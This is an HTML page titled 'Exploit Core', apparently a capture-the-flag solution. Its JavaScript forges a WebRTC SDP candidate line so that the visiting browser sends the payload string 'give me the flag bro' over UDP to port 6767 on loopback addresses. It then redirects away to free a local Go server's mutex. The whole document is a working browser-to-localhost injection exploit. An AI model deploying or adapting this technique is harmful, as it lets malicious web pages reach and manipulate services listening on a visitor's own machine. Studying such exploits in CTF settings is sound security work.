<!DOCTYPE html>
<html>
<head>
    <title>Exploit Core</title>
</head>
<body>
    <h1>Initializing Network Stack...</h1>
    <script>
        // The Go server splits lines by \n and trims \n.
        // We construct a precise string that starts with our payload.
        const msg = "give me the flag bro\n";

        function forceLocalUdpPacket(targetIp) {
            try {
                const pc = new RTCPeerConnection();
                pc.createDataChannel("trigger");

                pc.createOffer().then(offer => {
                    // Create an explicit spoofed local candidate configuration line.
                    // When Firefox tries to map peers, it pushes this candidate 
                    // property over the local loopback socket.
                    const injectedCandidate = `a=candidate:1 1 UDP 1 ${targetIp} 6767 typ host typ ${msg}`;
                    
                    let customSdp = offer.sdp;
                    customSdp += "\r\n" + injectedCandidate;

                    const newOffer = new RTCSessionDescription({
                        type: offer.type,
                        sdp: customSdp
                    });

                    return pc.setLocalDescription(newOffer);
                }).catch(e => {});
            } catch(e) {}
        }

        // Test vectors targeting the explicit listener bindings
        forceLocalUdpPacket("127.0.0.1");
        forceLocalUdpPacket("[::1]");
        forceLocalUdpPacket("[::ffff:127.0.0.1]");

        // Self-terminate within 1.5 seconds to unlock the Go server's mutex
        setTimeout(() => {
            window.location.href = "about:blank";
        }, 1500);
    </script>
</body>
</html>
